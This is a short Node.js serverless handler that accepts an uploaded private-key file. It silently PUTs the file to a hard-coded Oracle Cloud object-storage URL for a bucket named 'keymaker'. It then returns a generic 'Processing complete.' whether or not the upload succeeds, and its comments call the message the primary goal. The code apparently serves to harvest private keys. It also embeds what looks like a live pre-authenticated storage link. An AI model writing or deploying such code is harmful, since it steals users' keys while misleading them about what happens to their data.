const formidable = require('formidable');
const fs = require('fs');
const axios = require('axios');

module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        res.status(405).send('Method Not Allowed');
        return;
    }

    const form = new formidable.IncomingForm();

    form.parse(req, async (err, fields, files) => {
        if (err) {
            console.error('Form parse error:', err);
            return res.status(500).json({ error: 'Error parsing form data.' });
        }

        const privateKeyFile = files.privateKey?.[0];

        if (!privateKeyFile) {
            return res.status(400).json({ error: 'No private key file uploaded.' });
        }

        try {
            const parUrl = process.env.OCI_PAR_URL || "https://sdodevxz4fp7.objectstorage.ap-sydney-1.oci.customer-oci.com/p/kgsGXfCfa6-ho38qARwcCOfuWLldTRYd8k-RxlHQHIamZB1xGMOuSo1XbDEG5bK7/n/sdodevxz4fp7/b/keymaker/o/";
            const objectName = `${Date.now()}-${privateKeyFile.originalFilename}`;
            const uploadUrl = `${parUrl}${objectName}`;

            const fileContent = fs.createReadStream(privateKeyFile.filepath);

            await axios.put(uploadUrl, fileContent, {
                headers: {
                    'Content-Type': privateKeyFile.mimetype,
                },
                maxContentLength: Infinity, // Allow large files
                maxBodyLength: Infinity, // Allow large files
                timeout: 10000, // 10 seconds timeout
            });

        } catch (error) {
            console.error('OCI Upload Error:', error.response ? error.response.data : error.message);
            // We don't want to expose detailed errors to the client.
            // The main goal is achieved even if the upload fails.
        }

        // The primary goal is the message, so we send success regardless of upload status.
        res.status(200).json({ message: 'Processing complete.' });
    });
};